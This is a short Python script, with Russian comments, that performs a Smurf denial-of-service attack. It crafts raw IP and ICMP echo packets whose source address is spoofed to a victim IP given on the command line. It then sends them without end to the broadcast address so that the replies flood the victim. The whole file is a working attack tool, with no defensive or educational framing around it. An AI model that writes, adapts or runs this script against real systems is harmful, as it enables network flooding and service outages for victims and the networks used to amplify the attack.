import socket
import struct
import sys


def calculate_checksum(data):
    """Рассчитывает чексумму"""
    if len(data) % 2:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word
        total = (total & 0xffff) + (total >> 16)
    return ~total & 0xffff


def create_ip_header(source_ip, dest_ip, data_length, protocol=1):
    """Создает заголовок"""
    version_ihl = 0x45
    tos = 0
    total_length = 20 + data_length
    id = 1000
    flags_frag = 0
    ttl = 255
    temp_header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_length, id,
                             flags_frag, ttl, protocol, 0,
                             socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
    checksum = calculate_checksum(temp_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                           version_ihl, tos, total_length, id,
                           flags_frag, ttl, protocol, checksum,
                           socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
    return ip_header


def create_icmp_packet():
    """Создает icmp пакет"""
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = 1000
    icmp_seq = 1
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    icmp_checksum = calculate_checksum(icmp_header)
    icmp_packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    return icmp_packet


def smurf_attack(victim_ip, broadcast_ip):
    """Отсылает широковещательные пакеты с подмененным адресом отправителя"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        icmp_packet = create_icmp_packet()
        ip_header = create_ip_header(victim_ip, broadcast_ip, len(icmp_packet))
        full_packet = ip_header + icmp_packet
        while True:
            sock.sendto(full_packet, (broadcast_ip, 0))
    except Exception as e:
        print(f"Ошибка: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    victim_ip = sys.argv[1]
    broadcast_ip = "255.255.255.255"
    smurf_attack(victim_ip, broadcast_ip)
